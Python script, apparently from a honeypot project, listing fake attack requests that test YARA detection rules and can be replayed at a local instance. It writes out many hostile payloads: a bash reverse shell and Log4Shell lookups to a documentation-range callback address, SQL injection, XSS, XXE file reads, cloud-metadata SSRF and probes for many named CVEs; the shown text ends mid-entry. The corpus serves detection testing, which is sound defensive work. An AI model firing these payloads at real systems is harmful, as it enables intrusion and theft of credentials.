#!/usr/bin/env python3

"""
Fake attack corpus for the YARA rules in rules/.

Each ATTACKS entry is one request and the attack_type the rules must report
for it; BENIGN entries must report none. tests/test_fake_attacks.py checks the
corpus against the rules, and this script replays it against a running Krawl
so the findings can be seen on the dashboard.

Usage: python scripts/fake_attacks.py [--url http://localhost:5000] [--only ssti | --only krawl_ssti]

Krawl ignores loopback clients, so requests carry X-Forwarded-For with a
documentation-range address (--source-ip) to be tracked when sent locally.
"""

from __future__ import annotations

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path

# Documentation range (RFC 5737), so payloads never point at a real host.
CALLBACK = "203.0.113.5"


@dataclass(frozen=True)
class FakeRequest:
    name: str
    expect: str | None = None
    rule: str | None = None  # YARA rule name that must fire
    method: str = "GET"
    path: str = "/"
    query: str = ""
    body: str = ""
    user_agent: str = "Mozilla/5.0 (X11; Linux x86_64) Firefox/131.0"
    headers: dict[str, str] = field(default_factory=dict)


ATTACKS = [
    # --- Path traversal / file inclusion ---
    FakeRequest(
        "traversal to /etc/passwd",
        "path_traversal",
        rule="krawl_path_traversal",
        path="/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    ),
    FakeRequest(
        "windows traversal",
        "path_traversal",
        rule="krawl_path_traversal",
        path="/download",
        query="file=..%5c..%5c..%5cwindows%5cwin.ini",
    ),
    FakeRequest(
        "php filter wrapper",
        "lfi_rfi",
        rule="krawl_lfi_rfi",
        path="/index.php",
        query="page=php://filter/convert.base64-encode/resource=config.php",
    ),
    # --- SQL injection ---
    FakeRequest(
        "union select",
        "sql_injection",
        rule="krawl_sql_injection",
        path="/product",
        query="id=1+UNION+SELECT+username,password+FROM+users--",
    ),
    FakeRequest(
        "login bypass comment",
        "sql_injection",
        rule="krawl_sql_injection",
        method="POST",
        path="/login",
        body="username=admin'--&password=x",
    ),
    FakeRequest(
        "time-based blind",
        "sql_injection",
        rule="krawl_sql_injection",
        path="/product",
        query="id=1+AND+SLEEP(5)",
    ),
    FakeRequest(
        "postgres time-based blind",
        "sql_injection",
        rule="krawl_sql_injection",
        path="/product",
        query="id=1;SELECT+pg_sleep(5)--",
    ),
    FakeRequest(
        "mssql time-based blind",
        "sql_injection",
        rule="krawl_sql_injection",
        path="/product",
        query="id=1';WAITFOR+DELAY+'0:0:5'--",
    ),
    # --- XSS ---
    FakeRequest(
        "reflected script tag",
        "xss_attempt",
        rule="krawl_xss_attempt",
        path="/search",
        query="q=<script>alert(document.cookie)</script>",
    ),
    FakeRequest(
        "svg onload",
        "xss_attempt",
        rule="krawl_xss_attempt",
        path="/profile",
        query="name=<svg/onload=alert(1)>",
    ),
    # --- XXE / LDAP ---
    FakeRequest(
        "xxe external entity",
        "xxe_injection",
        rule="krawl_xxe_injection",
        method="POST",
        path="/api/xml",
        body=(
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
            '"file:///etc/passwd">]><r>&x;</r>'
        ),
        headers={"Content-Type": "application/xml"},
    ),
    FakeRequest(
        "xxe hosts file",
        "xxe_injection",
        rule="krawl_xxe_injection",
        method="POST",
        path="/api/xml",
        body=(
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
            '"file:///etc/hosts">]><r>&x;</r>'
        ),
        headers={"Content-Type": "application/xml"},
    ),
    FakeRequest(
        "ldap filter break",
        "ldap_injection",
        rule="krawl_ldap_injection",
        path="/directory",
        query="user=*)(uid=*))(|(uid=*",
    ),
    # --- Command injection ---
    FakeRequest(
        "separator chain",
        "command_injection",
        rule="krawl_command_injection",
        path="/ping",
        query="host=127.0.0.1;cat /etc/hosts",
    ),
    FakeRequest(
        "subshell",
        "command_injection",
        rule="krawl_command_injection",
        path="/ping",
        query="ip=$(whoami)",
    ),
    FakeRequest(
        "pipe to uname",
        "command_injection",
        rule="krawl_command_injection",
        path="/ping",
        query="host=127.0.0.1|uname+-a",
    ),
    FakeRequest(
        "chained ls",
        "command_injection",
        rule="krawl_command_injection",
        path="/ping",
        query="host=127.0.0.1&&ls+-la",
    ),
    FakeRequest(
        "reverse shell",
        "command_injection",
        rule="krawl_command_injection",
        method="POST",
        path="/admin/run",
        body=f"cmd=bash -i >& /dev/tcp/{CALLBACK}/4444 0>&1",
    ),
    # --- Recon ---
    FakeRequest(
        "git config probe",
        "common_probes",
        rule="krawl_common_probes",
        path="/.git/config",
    ),
    FakeRequest(
        "dotenv probe", "common_probes", rule="krawl_common_probes", path="/.env"
    ),
    FakeRequest(
        "wordpress login",
        "login_attempt",
        rule="krawl_login_attempt",
        method="POST",
        path="/wp-login.php",
        body="log=admin&pwd=password",
    ),
    FakeRequest(
        "sqlmap user agent",
        "scanner_user_agent",
        rule="krawl_scanner_user_agent",
        user_agent="sqlmap/1.8.2#stable (https://sqlmap.org)",
    ),
    # --- rules/exploits.yar ---
    FakeRequest(
        "log4shell in user agent",
        "log4shell",
        rule="krawl_log4shell",
        user_agent=f"${{jndi:ldap://{CALLBACK}:1389/a}}",
    ),
    FakeRequest(
        "obfuscated log4shell",
        "log4shell",
        rule="krawl_log4shell",
        path="/api/search",
        query=f"q=${{${{lower:j}}ndi:${{lower:l}}dap://{CALLBACK}/a}}",
    ),
    FakeRequest(
        "jinja arithmetic probe",
        "ssti",
        rule="krawl_ssti",
        path="/hello",
        query="name={{7*7}}",
    ),
    FakeRequest(
        "el arithmetic probe",
        "ssti",
        rule="krawl_ssti",
        path="/hello",
        query="name=${7*191}",
    ),
    FakeRequest(
        "jinja square probe",
        "ssti",
        rule="krawl_ssti",
        path="/hello",
        query="name={{13*13}}",
    ),
    FakeRequest(
        "python object walk",
        "ssti",
        rule="krawl_ssti",
        method="POST",
        path="/preview",
        body="tpl={{''.__class__.__mro__[1].__subclasses__()}}",
    ),
    FakeRequest(
        "cloud metadata",
        "ssrf",
        rule="krawl_ssrf",
        path="/fetch",
        query="url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    ),
    FakeRequest(
        "aws role credentials",
        "ssrf",
        rule="krawl_ssrf",
        path="/fetch",
        query="url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role",
    ),
    FakeRequest(
        "gcp metadata token",
        "ssrf",
        rule="krawl_ssrf",
        path="/fetch",
        query="url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ),
    FakeRequest(
        "azure instance metadata",
        "ssrf",
        rule="krawl_ssrf",
        path="/fetch",
        query="url=http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ),
    FakeRequest(
        "gopher to redis",
        "ssrf",
        rule="krawl_ssrf",
        path="/fetch",
        query="url=gopher://127.0.0.1:6379/_FLUSHALL",
    ),
    FakeRequest(
        "shellshock user agent",
        "shellshock",
        rule="krawl_shellshock",
        path="/cgi-bin/status",
        user_agent="() { :; }; /bin/bash -c 'id'",
    ),
    FakeRequest(
        "nosql operator in query",
        "nosql_injection",
        rule="krawl_nosql_injection",
        path="/login",
        query="username[$ne]=x&password[$ne]=x",
    ),
    FakeRequest(
        "nosql operator in json",
        "nosql_injection",
        rule="krawl_nosql_injection",
        method="POST",
        path="/api/login",
        body='{"username": {"$ne": null}, "password": {"$ne": null}}',
        headers={"Content-Type": "application/json"},
    ),
    FakeRequest(
        "crlf header injection",
        "crlf_injection",
        rule="krawl_crlf_injection",
        path="/redirect",
        query="next=%0d%0aSet-Cookie:%20session=attacker",
    ),
    # --- Header-only attacks ---
    FakeRequest(
        "log4shell in custom header",
        "log4shell",
        rule="krawl_log4shell",
        path="/",
        headers={"X-Api-Version": "${jndi:ldap://" + CALLBACK + "/a}"},
    ),
    FakeRequest(
        "shellshock in cookie",
        "shellshock",
        rule="krawl_shellshock",
        path="/cgi-bin/status",
        headers={"Cookie": "() { :;}; /bin/id"},
    ),
    # --- Enterprise, edge and framework CVEs ---
    FakeRequest(
        "spring4shell classloader binding",
        "cve_2022_22965",
        rule="krawl_cve_2022_22965_spring4shell",
        method="POST",
        path="/app/index",
        body="class.module.classLoader.resources.context.parent.pipeline.first.pattern=x",
    ),
    FakeRequest(
        "spring cloud function header",
        "cve_2022_22963",
        rule="krawl_cve_2022_22963_spring_cloud_function",
        path="/functionRouter",
        headers={
            "spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime()"
        },
    ),
    FakeRequest(
        "spring gateway route injection",
        "cve_2022_22947",
        rule="krawl_cve_2022_22947_spring_cloud_gateway",
        method="POST",
        path="/actuator/gateway/routes/probe",
    ),
    FakeRequest(
        "struts2 ognl content-type",
        "cve_2017_5638",
        rule="krawl_cve_2017_5638_struts2_content_type",
        path="/index.action",
        headers={
            "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}"
        },
    ),
    FakeRequest(
        "struts2 redirect prefix",
        "cve_2013_2251",
        rule="krawl_cve_2013_2251_struts2_redirect",
        path="/index.action",
        query="redirect:${#a=1}",
    ),
    FakeRequest(
        "struts2 top.uploadFileName",
        "cve_2023_50164",
        rule="krawl_cve_2023_50164_struts2_upload_traversal",
        method="POST",
        path="/upload.action",
        body="top.UploadFileName=../../shell.jsp",
    ),
    FakeRequest(
        "weblogic console traversal",
        "cve_2020_14882",
        rule="krawl_cve_2020_14882_weblogic_console",
        path="/console/images/%252E%252E%252Fconsole.portal",
    ),
    FakeRequest(
        "weblogic wls-wsat",
        "cve_2017_10271",
        rule="krawl_cve_2017_10271_weblogic_wls_wsat",
        method="POST",
        path="/wls-wsat/CoordinatorPortType",
    ),
    FakeRequest(
        "weblogic async service",
        "cve_2019_2725",
        rule="krawl_cve_2019_2725_weblogic_async",
        method="POST",
        path="/_async/AsyncResponseService",
    ),
    FakeRequest(
        "apache 2.4.49 dot segments",
        "cve_2021_41773",
        rule="krawl_cve_2021_41773_apache_path_traversal",
        path="/cgi-bin/.%2e/.%2e/.%2e/bin/sh",
    ),
    FakeRequest(
        "confluence ognl in path",
        "cve_2022_26134",
        rule="krawl_cve_2022_26134_confluence_ognl",
        path="/${@java.lang.Runtime@getRuntime()}/",
    ),
    FakeRequest(
        "confluence doenterpagevariables",
        "cve_2021_26084",
        rule="krawl_cve_2021_26084_confluence_ognl_vars",
        method="POST",
        path="/pages/doenterpagevariables.action",
    ),
    FakeRequest(
        "confluence setupComplete",
        "cve_2023_22515",
        rule="krawl_cve_2023_22515_confluence_setup",
        path="/server-info.action",
        query="bootstrapStatusProvider.applicationConfig.setupComplete=false",
    ),
    FakeRequest(
        "confluence setup-restore",
        "cve_2023_22518",
        rule="krawl_cve_2023_22518_confluence_restore",
        method="POST",
        path="/json/setup-restore.action",
    ),
    FakeRequest(
        "confluence text-inline.vm",
        "cve_2023_22527",
        rule="krawl_cve_2023_22527_confluence_template",
        method="POST",
        path="/template/aui/text-inline.vm",
    ),
    FakeRequest(
        "jira contact administrators",
        "cve_2019_11581",
        rule="krawl_cve_2019_11581_jira_contact_admin",
        path="/secure/ContactAdministrators!default.jspa",
    ),
    FakeRequest(
        "exchange proxylogon cookie",
        "cve_2021_26855",
        rule="krawl_cve_2021_26855_exchange_proxylogon",
        path="/ecp/x.js",
        headers={"Cookie": "X-BEResource=localhost/owa/auth/x.js?~3"},
    ),
    FakeRequest(
        "exchange proxyshell autodiscover",
        "cve_2021_34473",
        rule="krawl_cve_2021_34473_exchange_proxyshell",
        path="/autodiscover/autodiscover.json",
        query="@x.example/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@x.example",
    ),
    FakeRequest(
        "exchange proxynotshell",
        "cve_2022_41040",
        rule="krawl_cve_2022_41040_exchange_proxynotshell",
        path="/autodiscover/autodiscover.json",
        query="@x.example/owa/&Email=autodiscover/autodiscover.json%3f@x.example&Protocol=XYZ",
    ),
    FakeRequest(
        "vcenter uploadova",
        "cve_2021_21972",
        rule="krawl_cve_2021_21972_vcenter_uploadova",
        method="POST",
        path="/ui/vropspluginui/rest/services/uploadova",
    ),
    FakeRequest(
        "vcenter analytics telemetry",
        "cve_2021_22005",
        rule="krawl_cve_2021_22005_vcenter_telemetry_upload",
        method="POST",
        path="/analytics/telemetry/ph/api/hyper/send",
    ),
    FakeRequest(
        "vcenter vsan health check",
        "cve_2021_21985",
        rule="krawl_cve_2021_21985_vcenter_vsan",
        method="POST",
        path="/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setTargetObject",
    ),
    FakeRequest(
        "workspace one deviceUdid",
        "cve_2022_22954",
        rule="krawl_cve_2022_22954_workspace_one_ssti",
        path="/catalog-portal/ui/oauth/verify",
        query="error=&deviceUdid=${7*7}",
    ),
    FakeRequest(
        "citrix adc vpns traversal",
        "cve_2019_19781",
        rule="krawl_cve_2019_19781_citrix_adc_traversal",
        path="/vpn/../vpns/portal/scripts/newbm.pl",
    ),
    FakeRequest(
        "citrix gwtest formssso",
        "cve_2023_3519",
        rule="krawl_cve_2023_3519_citrix_adc_formssso",
        path="/gwtest/formssso",
        query="event=start&target=x",
    ),
    FakeRequest(
        "f5 tmui login.jsp traversal",
        "cve_2020_5902",
        rule="krawl_cve_2020_5902_f5_tmui",
        path="/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp",
    ),
    FakeRequest(
        "f5 icontrol util bash",
        "cve_2022_1388",
        rule="krawl_cve_2022_1388_f5_icontrol_bash",
        method="POST",
        path="/mgmt/tm/util/bash",
    ),
    FakeRequest(
        "ivanti totp backup-code traversal",
        "cve_2023_46805",
        rule="krawl_cve_2023_46805_ivanti_connect_secure",
        path="/api/v1/totp/user-backup-code/../../license/keys-status/x",
    ),
    FakeRequest(
        "ivanti epmm mifs api",
        "cve_2023_35078",
        rule="krawl_cve_2023_35078_ivanti_epmm",
        path="/mifs/aad/api/v2/authorized/users",
        query="adminDeviceSpaceId=1",
    ),
    FakeRequest(
        "pulse secure dana traversal",
        "cve_2019_11510",
        rule="krawl_cve_2019_11510_pulse_secure_dana",
        path="/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd",
    ),
    FakeRequest(
        "fortios fgt_lang traversal",
        "cve_2018_13379",
        rule="krawl_cve_2018_13379_fortios_fgt_lang",
        path="/remote/fgt_lang",
        query="lang=/../../../..//////////dev/cmdb/sslvpn_websession",
    ),
    FakeRequest(
        "fortios report runner",
        "cve_2022_40684",
        rule="krawl_cve_2022_40684_fortios_auth_bypass",
        path="/api/v2/cmdb/system/admin/admin",
        user_agent="Report Runner",
    ),
    FakeRequest(
        "panos globalprotect sessid",
        "cve_2024_3400",
        rule="krawl_cve_2024_3400_panos_globalprotect",
        path="/ssl-vpn/hipreport.esp",
        headers={
            "Cookie": "SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/x"
        },
    ),
    FakeRequest(
        "cisco ios xe webui logon_hash",
        "cve_2023_20198",
        rule="krawl_cve_2023_20198_cisco_ios_xe_webui",
        path="/webui/logoutconfirm.html",
        query="logon_hash=1",
    ),
    FakeRequest(
        "cisco asa translation-table",
        "cve_2020_3452",
        rule="krawl_cve_2020_3452_cisco_asa_cscot",
        path="/+CSCOT+/translation-table",
        query="type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../",
    ),
    FakeRequest(
        "cisco rv config.exp",
        "cve_2019_1653",
        rule="krawl_cve_2019_1653_cisco_rv_config_exp",
        path="/cgi-bin/config.exp",
    ),
    FakeRequest(
        "moveit silock header",
        "cve_2023_34362",
        rule="krawl_cve_2023_34362_moveit_transfer",
        path="/guestaccess.aspx",
        headers={"X-siLock-Transaction": "folder_add_by_path"},
    ),
    FakeRequest(
        "teamcity admin token",
        "cve_2023_42793",
        rule="krawl_cve_2023_42793_teamcity_rpc2",
        method="POST",
        path="/app/rest/users/id:1/tokens/RPC2",
    ),
    FakeRequest(
        "teamcity jsp bypass",
        "cve_2024_27198",
        rule="krawl_cve_2024_27198_teamcity_jsp_bypass",
        path="/hax",
        query="jsp=/app/rest/server;.jsp",
    ),
    FakeRequest(
        "jenkins descriptorByName checkScript",
        "cve_2018_1000861",
        rule="krawl_cve_2018_1000861_jenkins_stapler",
        path="/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript",
    ),
    FakeRequest(
        "jenkins cli remoting",
        "cve_2024_23897",
        rule="krawl_cve_2024_23897_jenkins_cli_file_read",
        method="POST",
        path="/cli",
        query="remoting=false",
    ),
    FakeRequest(
        "gitlab djvu upload",
        "cve_2021_22205",
        rule="krawl_cve_2021_22205_gitlab_exiftool",
        method="POST",
        path="/uploads/user",
        body="AT&TFORM\x00\x00\x03¯DJVMDIRM",
    ),
    FakeRequest(
        "gitlab reset email array",
        "cve_2023_7028",
        rule="krawl_cve_2023_7028_gitlab_password_reset",
        method="POST",
        path="/users/password",
        body="authenticity_token=x&user[email][]=a@example.com&user[email][]=b@example.com",
    ),
    FakeRequest(
        "metabase setup validate",
        "cve_2023_38646",
        rule="krawl_cve_2023_38646_metabase_setup_token",
        method="POST",
        path="/api/setup/validate",
        body='{"token":"x","details":{"db":"zip:/app/a.db;MODE=MSSQLServer;INIT=RUNSCRIPT FROM x"}}',
    ),
    FakeRequest(
        "papercut setupcompleted",
        "cve_2023_27350",
        rule="krawl_cve_2023_27350_papercut_setup",
        path="/app",
        query="service=page/SetupCompleted",
    ),
    FakeRequest(
        "telerik webresource",
        "cve_2019_18935",
        rule="krawl_cve_2019_18935_telerik_ui",
        path="/Telerik.Web.UI.WebResource.axd",
        query="type=rau",
    ),
    FakeRequest(
        "manageengine restapi",
        "cve_2021_40539",
        rule="krawl_cve_2021_40539_manageengine_adselfservice",
        method="POST",
        path="/./RestAPI/LogonCustomization",
    ),
    FakeRequest(
        "manageengine mdmLogUploader",
        "cve_2020_10189",
        rule="krawl_cve_2020_10189_manageengine_desktop_central",
        method="POST",
        path="/mdm/client/v1/mdmLogUploader",
    ),
    FakeRequest(
        "geoserver wfs exec",
        "cve_2024_36401",
        rule="krawl_cve_2024_36401_geoserver_eval",
        method="POST",
        path="/geoserver/wfs",
        body="<wfs:GetPropertyValue><wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'id')</wfs:valueReference></wfs:GetPropertyValue>",
    ),
    FakeRequest(
        "shiro rememberMe cookie",
        "cve_2016_4437",
        rule="krawl_cve_2016_4437_shiro_rememberme",
        path="/",
        headers={
            "Cookie": "rememberMe=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        },
    ),
    FakeRequest(
        "tomcat put jsp trailing slash",
        "cve_2017_12615",
        rule="krawl_cve_2017_12615_tomcat_put_jsp",
        method="PUT",
        path="/uploads/x.jsp/",
    ),
    FakeRequest(
        "ofbiz requirePasswordChange",
        "cve_2023_51467",
        rule="krawl_cve_2023_51467_ofbiz_auth_bypass",
        method="POST",
        path="/webtools/control/ProgramExport",
        query="USERNAME=&PASSWORD=&requirePasswordChange=Y",
    ),
    FakeRequest(
        "nacos auth users",
        "cve_2021_29441",
        rule="krawl_cve_2021_29441_nacos_auth_bypass",
        path="/nacos/v1/auth/users",
        user_agent="Nacos-Server",
    ),
    FakeRequest(
        "bitbucket archive --exec",
        "cve_2022_36804",
        rule="krawl_cve_2022_36804_bitbucket_archive",
        path="/rest/api/latest/projects/X/repos/Y/archive",
        query="prefix=ax%00--exec=%60id%60",
    ),
    FakeRequest(
        "zimbra mboximport",
        "cve_2022_27925",
        rule="krawl_cve_2022_27925_zimbra_mboximport",
        method="POST",
        path="/service/extension/backup/mboximport",
        query="account-name=admin&ow=2",
    ),
    FakeRequest(
        "oracle ebs bne upload",
        "cve_2022_21587",
        rule="krawl_cve_2022_21587_oracle_ebs_bne",
        method="POST",
        path="/OA_HTML/BneUploaderService",
        query="bne:uueupload=TRUE",
    ),
    FakeRequest(
        "sap recon ctcwebservice",
        "cve_2020_6287",
        rule="krawl_cve_2020_6287_sap_netweaver_recon",
        method="POST",
        path="/CTCWebService/CTCWebServiceBean",
    ),
    FakeRequest(
        "sap metadatauploader",
        "cve_2025_31324",
        rule="krawl_cve_2025_31324_sap_metadata_uploader",
        method="POST",
        path="/developmentserver/metadatauploader",
    ),
    FakeRequest(
        "webmin password_change old",
        "cve_2019_15107",
        rule="krawl_cve_2019_15107_webmin_password_change",
        method="POST",
        path="/password_change.cgi",
        body="user=rpc&pam=&expired=2&old=|id&new1=x&new2=x",
    ),
    FakeRequest(
        "openfire setup-s traversal",
        "cve_2023_32315",
        rule="krawl_cve_2023_32315_openfire_setup_traversal",
        path="/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp",
    ),
    FakeRequest(
        "grafana plugin traversal",
        "cve_2021_43798",
        rule="krawl_cve_2021_43798_grafana_plugin_traversal",
        path="/public/plugins/alertlist/../../../../../../../etc/hosts",
    ),
    FakeRequest(
        "rails accept traversal",
        "cve_2019_5418",
        rule="krawl_cve_2019_5418_rails_accept_traversal",
        path="/",
        headers={"Accept": "../../../../etc/hosts{{"},
    ),
    FakeRequest(
        "nextjs middleware subrequest",
        "cve_2025_29927",
        rule="krawl_cve_2025_29927_nextjs_middleware_bypass",
        path="/admin",
        headers={
            "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"
        },
    ),
    FakeRequest(
        "react2shell resolved_model chunk",
        "cve_2025_55182",
        rule="krawl_cve_2025_55182_react2shell",
        method="POST",
        path="/",
        headers={"next-action": "x"},
        body='{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
        "\"process.mainModule.require('child_process').execSync('id');\","
        '"_formData":{"get":"$1:constructor:constructor"}}}',
    ),
    FakeRequest(
        "react2shell lazy prototype chain",
        "cve_2025_55182",
        rule="krawl_cve_2025_55182_react2shell",
        method="POST",
        path="/app",
        body='0:{"__proto__":{"__proto__":{"type":"require","id":"child_process"}}}\n'
        '1:{"$$typeof":"$Lazy","_payload":{"_status":0,"_result":"child_process"}}',
    ),
    FakeRequest(
        "react2shell server reference",
        "cve_2025_55182",
        rule="krawl_cve_2025_55182_react2shell",
        method="POST",
        path="/app",
        body='0:["$SR","child_process","execSync",["id"]]',
    ),
    FakeRequest(
        "jboss jmxinvoker",
        "cve_2015_7501",
        rule="krawl_cve_2015_7501_jboss_invoker",
        method="POST",
        path="/invoker/JMXInvokerServlet",
    ),
    # --- PHP and CMS CVEs ---
    FakeRequest(
        "phpunit eval-stdin",
        "cve_2017_9841",
        rule="krawl_cve_2017_9841_phpunit_eval_stdin",
        method="POST",
        path="/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    ),
    FakeRequest(
        "php-cgi argument injection",
        "cve_2012_1823",
        rule="krawl_cve_2012_1823_php_cgi_argument",
        method="POST",
        path="/index.php",
        query="%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
    ),
    FakeRequest(
        "thinkphp invokefunction",
        "cve_2018_20062",
        rule="krawl_cve_2018_20062_thinkphp_rce",
        path="/index.php",
        query="s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=id",
    ),
    FakeRequest(
        "laravel ignition execute-solution",
        "cve_2021_3129",
        rule="krawl_cve_2021_3129_laravel_ignition",
        method="POST",
        path="/_ignition/execute-solution",
    ),
    FakeRequest(
        "drupalgeddon2 post_render",
        "cve_2018_7600",
        rule="krawl_cve_2018_7600_drupalgeddon2",
        method="POST",
        path="/user/register",
        query="element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
        body="form_id=user_register_form&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id",
    ),
    FakeRequest(
        "joomla object injection user-agent",
        "cve_2015_8562",
        rule="krawl_cve_2015_8562_joomla_object_injection",
        path="/",
        user_agent='x}__test|O:21:"JDatabaseDriverMysqli":0:{}',
    ),
    FakeRequest(
        "joomla api config disclosure",
        "cve_2023_23752",
        rule="krawl_cve_2023_23752_joomla_config_disclosure",
        path="/api/index.php/v1/config/application",
        query="public=true",
    ),
    FakeRequest(
        "wp file manager connector",
        "cve_2020_25213",
        rule="krawl_cve_2020_25213_wp_file_manager",
        method="POST",
        path="/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
    ),
    FakeRequest(
        "wp duplicator download",
        "cve_2020_11738",
        rule="krawl_cve_2020_11738_wp_duplicator",
        path="/wp-admin/admin-ajax.php",
        query="action=duplicator_download&file=/../wp-config.php",
    ),
    FakeRequest(
        "wp-automatic csv.php",
        "cve_2024_27956",
        rule="krawl_cve_2024_27956_wp_automatic_sqli",
        method="POST",
        path="/wp-content/plugins/wp-automatic/inc/csv.php",
    ),
    FakeRequest(
        "wp social warfare swp_debug",
        "cve_2019_9978",
        rule="krawl_cve_2019_9978_wp_social_warfare",
        path="/wp-admin/admin-post.php",
        query="swp_debug=load_options&swp_url=http://203.0.113.5/x.txt",
    ),
    FakeRequest(
        "wp backup-migration backup-heart",
        "cve_2023_6553",
        rule="krawl_cve_2023_6553_wp_backup_migration",
        method="POST",
        path="/wp-content/plugins/backup-backup/includes/backup-heart.php",
    ),
    FakeRequest(
        "wp really simple security 2fa",
        "cve_2024_10924",
        rule="krawl_cve_2024_10924_wp_really_simple_security",
        path="/",
        query="rest_route=/reallysimplessl/v1/two_fa/skip_onboarding",
    ),
    FakeRequest(
        "wp xmlrpc multicall brute force",
        "wp_xmlrpc_multicall",
        rule="krawl_wordpress_xmlrpc_multicall",
        method="POST",
        path="/xmlrpc.php",
        body="<methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member></struct></value></data></array></value></param></params></methodCall>",
    ),
    FakeRequest(
        "vbulletin widget_php",
        "cve_2019_16759",
        rule="krawl_cve_2019_16759_vbulletin_widget_php",
        method="POST",
        path="/",
        body="routestring=ajax/render/widget_php&widgetConfig[code]=echo 1;",
    ),
    FakeRequest(
        "craft cms conditions render",
        "cve_2023_41892",
        rule="krawl_cve_2023_41892_craft_cms_conditions",
        method="POST",
        path="/index.php",
        body="action=conditions/render&configObject=craft\\elements\\conditions\\ElementCondition",
    ),
    # --- IoT and router CVEs ---
    FakeRequest(
        "gpon diag_Form",
        "cve_2018_10561",
        rule="krawl_cve_2018_10561_gpon_router",
        method="POST",
        path="/GponForm/diag_Form",
        query="images/",
    ),
    FakeRequest(
        "huawei hg532 DeviceUpgrade",
        "cve_2017_17215",
        rule="krawl_cve_2017_17215_huawei_hg532",
        method="POST",
        path="/ctrlt/DeviceUpgrade_1",
    ),
    FakeRequest(
        "realtek miniigd picsdesc",
        "cve_2014_8361",
        rule="krawl_cve_2014_8361_realtek_sdk_miniigd",
        path="/picsdesc.xml",
    ),
    FakeRequest(
        "hikvision webLanguage",
        "cve_2021_36260",
        rule="krawl_cve_2021_36260_hikvision_weblanguage",
        method="PUT",
        path="/SDK/webLanguage",
    ),
    FakeRequest(
        "hikvision auth backdoor",
        "cve_2017_7921",
        rule="krawl_cve_2017_7921_hikvision_auth_backdoor",
        path="/Security/users",
        query="auth=YWRtaW46MTEK",
    ),
    FakeRequest(
        "zyxel ztp handler",
        "cve_2022_30525",
        rule="krawl_cve_2022_30525_zyxel_ztp",
        method="POST",
        path="/ztp/cgi-bin/handler",
    ),
    FakeRequest(
        "zyxel viewlog.asp",
        "cve_2017_18368",
        rule="krawl_cve_2017_18368_zyxel_viewlog",
        method="POST",
        path="/cgi-bin/ViewLog.asp",
    ),
    FakeRequest(
        "tplink archer locale",
        "cve_2023_1389",
        rule="krawl_cve_2023_1389_tplink_archer_locale",
        method="POST",
        path="/cgi-bin/luci/;stok=/locale",
        query="form=country&operation=write&country=x",
    ),
    FakeRequest(
        "netgear cgi-bin semicolon",
        "cve_2016_6277",
        rule="krawl_cve_2016_6277_netgear_cgi_bin_semicolon",
        path="/cgi-bin/;cat${IFS}/etc/passwd",
    ),
    FakeRequest(
        "draytek mainfunction.cgi",
        "cve_2020_8515",
        rule="krawl_cve_2020_8515_draytek_mainfunction",
        method="POST",
        path="/cgi-bin/mainfunction.cgi",
        body="action=login&keyPath=%27%0A/bin/id%0A%27",
    ),
    FakeRequest(
        "dahua rpc2_login",
        "cve_2021_33044",
        rule="krawl_cve_2021_33044_dahua_rpc2_login",
        method="POST",
        path="/RPC2_Login",
    ),
    FakeRequest(
        "realtek boa formPing",
        "cve_2021_35395",
        rule="krawl_cve_2021_35395_realtek_boa_goform",
        method="POST",
        path="/boaform/admin/formPing",
    ),
    FakeRequest(
        "tenda setUsbUnload",
        "cve_2020_10987",
        rule="krawl_cve_2020_10987_tenda_goform",
        method="POST",
        path="/goform/setUsbUnload",
    ),
    FakeRequest(
        "linksys tmUnblock",
        "linksys_tmunblock",
        rule="krawl_iot_linksys_tmunblock",
        method="POST",
        path="/tmUnblock.cgi",
    ),
    FakeRequest(
        "dlink hnap soapaction injection",
        "dlink_hnap",
        rule="krawl_iot_dlink_hnap",
        method="POST",
        path="/HNAP1/",
        headers={
            "SOAPAction": '"http://purenetworks.com/HNAP1/GetDeviceSettings/`id`"'
        },
    ),
    # --- Generic exploit families ---
    FakeRequest(
        "ognl member access",
